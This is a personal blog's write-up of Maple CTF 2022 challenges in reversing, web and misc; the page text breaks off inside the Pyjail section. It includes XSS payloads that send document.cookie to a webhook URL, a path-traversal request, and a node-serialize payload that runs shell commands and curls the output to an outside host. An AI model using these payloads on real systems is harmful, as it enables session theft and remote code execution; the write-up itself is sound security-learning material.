@@ -1,0 +1,532 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/static/favicon/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/static/favicon/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/static/favicon/favicon-16x16.png">
+  <link rel="mask-icon" href="/static/favicon/safari_pinned_tab.svg" color="#222">
+  <link rel="manifest" href="/static/favicon/site.webmanifest">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"www.aynakeya.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.15.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":null,"post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInDown","sidebar":"fadeInDown"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="0x0 IntroudctionMaple CTF, which is first CTF event hold by Maple Bacon Team. Because it is the first CTF MapleBacon organzie a CTF event. This event is only open for current university students. Sinc">
+<meta property="og:type" content="website">
+<meta property="og:title" content="[writeup] Maple CTF 2022">
+<meta property="og:url" content="http://www.aynakeya.com/ctf-writeup/2022/saplingctf/sapling-ctf-2022-write-up.html">
+<meta property="og:site_name" content="Aynakeya&#39;s Blog">
+<meta property="og:description" content="0x0 IntroudctionMaple CTF, which is first CTF event hold by Maple Bacon Team. Because it is the first CTF MapleBacon organzie a CTF event. This event is only open for current university students. Sinc">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://www.aynakeya.com/ctf-writeup/2022/saplingctf/uploads/2022-01-28_223328.jpg">
+<meta property="og:image" content="http://www.aynakeya.com/ctf-writeup/2022/saplingctf/uploads/2022-01-28_223354.jpg">
+<meta property="og:image" content="http://www.aynakeya.com/ctf-writeup/2022/saplingctf/uploads/map.png">
+<meta property="og:image" content="http://www.aynakeya.com/ctf-writeup/2022/saplingctf/uploads/2022-01-28_233112.jpg">
+<meta property="og:image" content="http://www.aynakeya.com/ctf-writeup/2022/saplingctf/uploads/hijacked.png">
+<meta property="article:published_time" content="2022-01-29T06:37:26.000Z">
+<meta property="article:modified_time" content="2023-03-16T05:45:26.277Z">
+<meta property="article:author" content="Aynakeya">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="writeup">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="misc">
+<meta property="article:tag" content="crypto">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.aynakeya.com/ctf-writeup/2022/saplingctf/uploads/2022-01-28_223328.jpg">
+
+
+<link rel="canonical" href="http://www.aynakeya.com/ctf-writeup/2022/saplingctf/sapling-ctf-2022-write-up">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":false,"lang":"en","comments":true,"permalink":"http://www.aynakeya.com/ctf-writeup/2022/saplingctf/sapling-ctf-2022-write-up.html","path":"ctf-writeup/2022/saplingctf/sapling-ctf-2022-write-up.html","title":"[writeup] Maple CTF 2022"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>[writeup] Maple CTF 2022 | Aynakeya's Blog
+</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Aynakeya's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Kill My Emotion</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/blog/" rel="section"><i class="fa fa-house fa-fw"></i>Home</a></li><li class="menu-item menu-item-infosec"><a href="/categories/ctf" rel="section"><i class="fa fa-solid fa-code fa-fw"></i>InfoSec</a></li><li class="menu-item menu-item-coding"><a href="/categories/coding" rel="section"><i class="fa fa-solid fa-code fa-fw"></i>Coding</a></li><li class="menu-item menu-item-anime"><a href="/categories/anime" rel="section"><i class="fa fa-solid fa-film fa-fw"></i>Anime</a></li><li class="menu-item menu-item-novel"><a href="/categories/novel" rel="section"><i class="fa fa-solid fa-book-open fa-fw"></i>Novel</a></li><li class="menu-item menu-item-life"><a href="/categories/life" rel="section"><i class="fa fa-solid fa-book fa-fw"></i>Life</a></li><li class="menu-item menu-item-devops"><a href="/categories/devops" rel="section"><i class="fa fa-solid fa-terminal fa-fw"></i>DevOps</a></li><li class="menu-item menu-item-archives"><a href="/archives" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-ctf-writeup"><a href="/ctf-writeup" rel="section"><i class="fa fa-book fa-fw"></i>CTF-writeup</a></li><li class="menu-item menu-item-bookmarks"><a href="/bookmarks" rel="section"><i class="fa fa-bookmark fa-fw"></i>Bookmarks</a></li><li class="menu-item menu-item-tags"><a href="/tags" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-js-projects"><a href="/my-js-project" rel="section"><i class="fas fa-folder fa-fw"></i>Js-projects</a></li><li class="menu-item menu-item-frontpage"><a href="/" rel="section"><i class="fa fa-leaf fa-fw"></i>Frontpage</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x0-Introudction"><span class="nav-number">1.</span> <span class="nav-text">0x0 Introudction</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x1-problems-I-solved"><span class="nav-number">2.</span> <span class="nav-text">0x1 problems I solved</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x2-Reverse"><span class="nav-number">3.</span> <span class="nav-text">0x2 Reverse</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#plain"><span class="nav-number">3.1.</span> <span class="nav-text">plain</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#keys"><span class="nav-number">3.2.</span> <span class="nav-text">keys</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x3-web"><span class="nav-number">4.</span> <span class="nav-text">0x3 web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Doot-Doot"><span class="nav-number">4.1.</span> <span class="nav-text">Doot Doot</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Color-Me"><span class="nav-number">4.2.</span> <span class="nav-text">Color Me</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Poem-Me"><span class="nav-number">4.3.</span> <span class="nav-text">Poem Me</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Super-Cereal"><span class="nav-number">4.4.</span> <span class="nav-text">Super Cereal</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x4-Misc"><span class="nav-number">5.</span> <span class="nav-text">0x4 Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#CTF-Adventure-Land-1"><span class="nav-number">5.1.</span> <span class="nav-text">CTF Adventure Land 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Cutoff"><span class="nav-number">5.2.</span> <span class="nav-text">Cutoff</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#What-Is-A-Word"><span class="nav-number">5.3.</span> <span class="nav-text">What Is A Word</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pyjail"><span class="nav-number">5.4.</span> <span class="nav-text">Pyjail</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Intended-solution"><span class="nav-number">5.4.1.</span> <span class="nav-text">Intended solution</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Unintended-solution"><span class="nav-number">5.4.2.</span> <span class="nav-text">Unintended solution</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#flag"><span class="nav-number">5.4.3.</span> <span class="nav-text">flag</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Hijacked"><span class="nav-number">5.5.</span> <span class="nav-text">Hijacked</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x5-Crypto"><span class="nav-number">6.</span> <span class="nav-text">0x5 Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Factor-Me"><span class="nav-number">6.1.</span> <span class="nav-text">Factor Me</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Too-Large-to-Factor"><span class="nav-number">6.2.</span> <span class="nav-text">Too Large to Factor</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Copilot-my-savior"><span class="nav-number">6.3.</span> <span class="nav-text">Copilot my savior</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Blindfolded"><span class="nav-number">6.4.</span> <span class="nav-text">Blindfolded</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Cut-and-paste"><span class="nav-number">6.5.</span> <span class="nav-text">Cut and paste</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#One-two-three"><span class="nav-number">6.6.</span> <span class="nav-text">One two three</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Propagation"><span class="nav-number">6.7.</span> <span class="nav-text">Propagation</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x6-PWN"><span class="nav-number">7.</span> <span class="nav-text">0x6 PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#memowy-cowwuption"><span class="nav-number">7.1.</span> <span class="nav-text">memowy cowwuption</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#wetuwn-addwess"><span class="nav-number">7.2.</span> <span class="nav-text">wetuwn addwess</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#wetuwn-owiented-pwogwamming"><span class="nav-number">7.3.</span> <span class="nav-text">wetuwn owiented pwogwamming</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#wetuwn-to-wibc"><span class="nav-number">7.4.</span> <span class="nav-text">wetuwn to wibc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#uwu-intewpwetew"><span class="nav-number">7.5.</span> <span class="nav-text">uwu intewpwetew</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Aynakeya"
+      src="/static/intro/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Aynakeya</p>
+  <div class="site-description" itemprop="description">my blog~</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives">
+          <span class="site-state-item-count">91</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags">
+        <span class="site-state-item-count">73</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/aynakeya" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;aynakeya" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:aynakeya@aynakeya.com" title="E-Mail → mailto:aynakeya@aynakeya.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://space.bilibili.com/10003632" title="Bilibili → https:&#x2F;&#x2F;space.bilibili.com&#x2F;10003632" rel="noopener me" target="_blank"><i class="fas fa-video fa-fw"></i>Bilibili</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner page posts-expand">
+
+
+    
+    
+    
+    <div class="post-block" lang="en"><header class="post-header">
+
+<h1 class="post-title" itemprop="name headline">[writeup] Maple CTF 2022
+</h1>
+
+<div class="post-meta-container">
+  <ul class="breadcrumb">
+            <li><a href="/ctf-writeup/">CTF-WRITEUP</a></li>
+            <li><a href="/ctf-writeup/2022/">2022</a></li>
+            <li><a href="/ctf-writeup/2022/saplingctf/">SAPLINGCTF</a></li>
+            <li>SAPLING-CTF-2022-WRITE-UP</li>
+  </ul>
+</div>
+
+</header>
+
+      
+      
+      <div class="post-body">
+          <h1 id="0x0-Introudction"><a href="#0x0-Introudction" class="headerlink" title="0x0 Introudction"></a>0x0 Introudction</h1><p>Maple CTF, which is first CTF event hold by Maple Bacon Team. Because it is the first CTF MapleBacon organzie a CTF event. This event is only open for current university students.</p>
+<p>Since most of senior team member and main team member didn&#39;t participate CTF (because they are in charge of design problems), I was able to get a very good position when ctf ends.</p>
+<p>Since I only knows about pwn, for other category question, I basically OSINT, just search google for similar question and look its writeup.</p>
+<p>But I actually learned a lot during the event. <strong>AND</strong></p>
+<p>I get 2nd in individual and 3rd in team. Yeah!!!!!!!!!!!!!!!!!!</p>
+<span id="more"></span>
+
+<p><img data-src="uploads/2022-01-28_223328.jpg" alt="2022-01-28_223328"></p>
+<p><img data-src="uploads/2022-01-28_223354.jpg" alt="2022-01-28_223354.jpg"></p>
+<h1 id="0x1-problems-I-solved"><a href="#0x1-problems-I-solved" class="headerlink" title="0x1 problems I solved"></a>0x1 problems I solved</h1><p>some challenge are pretty simple and straight forward, so I will only do simple write up.</p>
+<p>But some question is very interesting, i highly recommend to take look at these challenge: <strong>pyjail</strong>, <strong>uwu-intewpwetew</strong>, <strong>birbs</strong>, <strong>pwintf</strong>, and most of the crypto question</p>
+<p><strong>rev</strong></p>
+<ul>
+<li><a href="#plain">plain</a></li>
+<li><a href="#keys">Keys</a><br><strong>web</strong></li>
+<li><a href="#Doot-Doot">Doot Doot</a></li>
+<li><a href="#Color-Me">Color Me</a></li>
+<li><a href="#Poem-Me">Poem Me</a></li>
+<li><a href="#Super-Cereal">Super Cereal</a><br><strong>misc</strong></li>
+<li><a href="#CTF-Adventure-Land-1">CTF Adventure Land 1</a></li>
+<li><a href="#Cutoff">Cutoff</a></li>
+<li><a href="#What-Is-A-Word">What Is A Word</a></li>
+<li><a href="#Pyjail">Pyjail 1 &amp; 2 &amp; 3</a></li>
+<li><a href="#Hijacked">Hijacked!</a><br><strong>crypto</strong></li>
+<li><a href="#Factor-Me">Factor Me</a></li>
+<li><a href="#Too-Large-to-Factor">Too Large to Factor</a></li>
+<li><a href="#Copilot-my-savior">Copilot-my-savior</a></li>
+<li><a href="#Blindfolded">Blindfolded</a></li>
+<li><a href="/2022/01/30/ctf/maplectf2022/maplectf2022-crypto-timing-attack/">Bit by Bit</a></li>
+<li><a href="#Cut-and-paste">Cut and paste</a></li>
+<li><a href="#One-two-three">One two three</a></li>
+<li><a href="#Propagation">Propagation</a><br><strong>pwn</strong></li>
+<li><a href="#memowy-cowwuption">memowy cowwuption</a></li>
+<li><a href="#wetuwn-addwess">wetuwn addwess</a></li>
+<li><a href="#wetuwn-owiented-pwogwamming">wetuwn owiented pwogwamming</a></li>
+<li><a href="#wetuwn-to-wibc">wetuwn to wibc</a></li>
+<li><a href="#uwu-intewpwetew">uwu intewpwetew</a></li>
+<li><a href="/2022/01/30/ctf/maplectf2022/maplectf2022-pwn-bruteforcing-canary/">birbs</a></li>
+<li><a href="/2022/02/02/ctf/how-to-utilize-printf-in-pwn/">baby pwintf</a></li>
+<li><a href="/2022/02/02/ctf/how-to-utilize-printf-in-pwn/">pwintf</a></li>
+</ul>
+<h1 id="0x2-Reverse"><a href="#0x2-Reverse" class="headerlink" title="0x2 Reverse"></a>0x2 Reverse</h1><p>I didn&#39;t do much question in reverse because I&#39;m too lazy to look at disassemble code, i just do some pretty straight forward question</p>
+<h2 id="plain"><a href="#plain" class="headerlink" title="plain"></a>plain</h2><p>the challenge provide an binary called <code>plain</code></p>
+<p>pretty straight forward, the flag is encoded in the binary. Using disassemble to check the code or just <code>strings plain</code> to get the flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(pyenv) aynakeya@LAPTOP-T6NBK8L5:~/ctf/maplectf2022/plain$ strings plain </span><br><span class="line">/lib64/ld-linux-x86-64.so.2</span><br><span class="line">...</span><br><span class="line">maple&#123;binaries_are_not_secret&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p><strong>flag</strong>: maple{binaries_are_not_secret}</p>
+<h2 id="keys"><a href="#keys" class="headerlink" title="keys"></a>keys</h2><p>check the binary with a decompiler, you will found that it takes the user input and XOR with a 4 byte array. It takes the xor result and compare with a bigger array. If all the bytes are same, it is the flag we want to know.</p>
+<p>So, since X ^ b ^ b &#x3D;&#x3D; X, we just xor to get the flag.</p>
+<p>here is the solution</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import string</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">mystery_bytes = [0x4a,0x83,0x04,0xd5]</span><br><span class="line">mystery_str = &quot;27e274b92ff870bd79dc4f9013dc4d8615cb30870ec0349179e75be424dc509d0fdc46e424b776ac37&quot;</span><br><span class="line">mystery_bytes_2 = [int(mystery_str[i:i+2],16) for i in range(0,len(mystery_str),2)]</span><br><span class="line"></span><br><span class="line">index = 0</span><br><span class="line">for index,s in enumerate(mystery_bytes_2):</span><br><span class="line">    print(chr(s^mystery_bytes[index &amp; 3]),end=&quot;&quot;)</span><br><span class="line"></span><br><span class="line">print()</span><br></pre></td></tr></table></figure>
+
+<p><strong>flag</strong>: maple{th3_KEY_IS_H4RDC0D3d_1n_THE_B1n4ry}</p>
+<h1 id="0x3-web"><a href="#0x3-web" class="headerlink" title="0x3 web"></a>0x3 web</h1><p>most of web I solved is related to XSS. This is the actually the first time I got an opportunity solve challenges related to XSS.</p>
+<hr>
+<h2 id="Doot-Doot"><a href="#Doot-Doot" class="headerlink" title="Doot Doot"></a>Doot Doot</h2><p>server.py</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&#x27;/oot&#x27;)</span><br><span class="line">def owo():</span><br><span class="line">    f = request.args.get(&#x27;oot&#x27;)</span><br><span class="line">    f = f + &#x27;.txt&#x27;</span><br><span class="line">    directories.append(f)</span><br><span class="line">    filename = &#x27;/&#x27;.join(directories)</span><br><span class="line">    try:</span><br><span class="line">        with open(filename, &#x27;r&#x27;) as filename:</span><br><span class="line">            file_content = filename.read(-1)</span><br><span class="line">    except:</span><br><span class="line">        file_content = &quot;INVALID FACT&quot;</span><br><span class="line">    finally:</span><br><span class="line">        directories.pop()</span><br><span class="line">    return render_template(&quot;portfolio.html&quot;, oot=file_content)</span><br></pre></td></tr></table></figure>
+
+<p>so, just go to &#x2F;oot?oot&#x3D;..&#x2F;flag to get the flag</p>
+<p><strong>flag</strong>: maple{Pingu_s4yz_N00t_No0T}</p>
+<hr>
+<h2 id="Color-Me"><a href="#Color-Me" class="headerlink" title="Color Me"></a>Color Me</h2><p>pretty straight forward question, it allow you to load arbitray html code into the page. And admin will visit the page.</p>
+<p>XSS scripts</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;script&gt;$.get(&quot;https://webhook.site/7b7b96e8-2831-41da-8997-b7c55b4f75ca?&quot;+document.cookie);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>flag</strong>: maple{0ops_i_f0rgot_about_xss}</p>
+<hr>
+<h2 id="Poem-Me"><a href="#Poem-Me" class="headerlink" title="Poem Me"></a>Poem Me</h2><p>similar to color me, the main difference is it filter out <code>&lt;script&gt;</code> and <code>&lt;/script&gt;</code></p>
+<p>the solution is also simple, replace <code>&lt;script&gt;</code> with <code>&lt;script nounce=&quot;a&quot;&gt;</code>, <code>&lt;/script&gt;</code> with <code>&lt;/script/&gt;</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js&quot;&gt;&lt;/script/&gt;&lt;script a&gt;$.get(&quot;https://webhook.site/7b7b96e8-2831-41da-8997-b7c55b4f75ca?&quot;%2Bdocument.cookie);&lt;/script/&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>flag</strong>: maple{why_m4ke_ur_0wn_5anitizers_wh3n_D0mpur1fy_ex1sts}</p>
+<hr>
+<h2 id="Super-Cereal"><a href="#Super-Cereal" class="headerlink" title="Super Cereal"></a>Super Cereal</h2><p>the main exploits here is it use unserialize</p>
+<p>server.js</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// get secret</span><br><span class="line">app.get(&#x27;/secret&#x27;, function(req, res) &#123;</span><br><span class="line">  if (req.cookies.profile)&#123;</span><br><span class="line">  const str = new Buffer(req.cookies.profile, &#x27;base64&#x27;).toString();</span><br><span class="line">  const obj = nodeSerial.unserialize(str);</span><br><span class="line">  if (obj.cereal)&#123;</span><br><span class="line">    const cereal = escape(obj.cereal);</span><br><span class="line">    res.render(&#x27;pages/secret&#x27;, &#123;</span><br><span class="line">    favcereal: cereal</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  res.render(&#x27;pages/secret&#x27;, &#123;</span><br><span class="line">    favcereal: &quot;&quot;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>unserialize allow us to execute arbitray javascript code in Node.</p>
+<p>So, use this payload and encode it into base64. send this payload to &#x2F;secret. We will get the flag.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;cereal&quot;:&quot;_$$ND_FUNC$$_function ()&#123;var ff=\&quot;ggg\&quot;;require(\&quot;child_process\&quot;).exec(\&quot;cat flag.txt\&quot;,function puts(error, stdout, stderr) &#123;require(\&quot;child_process\&quot;).exec(\&quot;curl https://webhook.site/7b7b96e8-2831-41da-8997-b7c55b4f75ca?flag=\&quot;+stdout+stderr)&#125;);return ff;&#125;()&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>flag</strong>: maple{0H_w41t_you_meant_ser1al_not_cer3al?}</p>
+<h1 id="0x4-Misc"><a href="#0x4-Misc" class="headerlink" title="0x4 Misc"></a>0x4 Misc</h1><p>misc question didn&#39;t have much too say, it involve lots of guess work. </p>
+<hr>
+<h2 id="CTF-Adventure-Land-1"><a href="#CTF-Adventure-Land-1" class="headerlink" title="CTF Adventure Land 1"></a>CTF Adventure Land 1</h2><p>there is a png called map.png, use red plane to review the flag</p>
+<p><img data-src="uploads/map.png" alt="map.png"><img data-src="uploads/2022-01-28_233112.jpg" alt="2022-01-28_233112.jpg"></p>
+<p><strong>flag</strong>: maple{w3lc0m3_70_m4pl3_b4c0n_4dv3n7ur3_l4nd}</p>
+<hr>
+<h2 id="Cutoff"><a href="#Cutoff" class="headerlink" title="Cutoff"></a>Cutoff</h2><p>this question is also simple, given a image with height 1267, but the actually height is 1400. So, edit PNG header, make the height back to 1400 to get the full flag.</p>
+<p><strong>flag</strong>: maple{very_l0NG_PnG}</p>
+<hr>
+<h2 id="What-Is-A-Word"><a href="#What-Is-A-Word" class="headerlink" title="What Is A Word"></a>What Is A Word</h2><p>unzip the .docx file and get the flag in image2.png</p>
+<p><strong>flag</strong>: maple{a_w0rd_on3_z1p!}</p>
+<hr>
+<h2 id="Pyjail"><a href="#Pyjail" class="headerlink" title="Pyjail"></a>Pyjail</h2><p>Pyjail are actually a series similar challenge with different black list.</p>
+<p>server.py</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">def main():</span><br><span class="line">    userinput = input(&#x27;&gt;&gt; &#x27;)</span><br><span class="line">    if len(userinput) &gt; 50:</span><br><span class="line">        raise Exception()</span><br><span class="line">    </span><br><span class="line">    # for pyjail 1</span><br><span class="line">    blacklist = [&#x27;eval&#x27;, &#x27;exec&#x27;, &#x27;rm&#x27;, &#x27;kill&#x27;, &#x27;+&#x27;]</span><br><span class="line">    # for pyjail 2</span><br><span class="line">    blacklist = [&#x27;eval&#x27;, &#x27;exec&#x27;, &#x27;import&#x27;, &#x27;os&#x27;, &#x27;=&#x27;, &#x27;txt&#x27;, &#x27;read&#x27;, &#x27;dict&#x27;, &#x27;;&#x27;, &#x27;:&#x27;, &#x27;\n&#x27;, &#x27;flag&#x27;, &#x27;subprocess&#x27;, &#x27;write&#x27;, &#x27;input&#x27;, &#x27;_&#x27;]</span><br><span class="line">    # for pyjail 3</span><br><span class="line">    blacklist = [&#x27;eval&#x27;, &#x27;exec&#x27;, &#x27;import&#x27;, 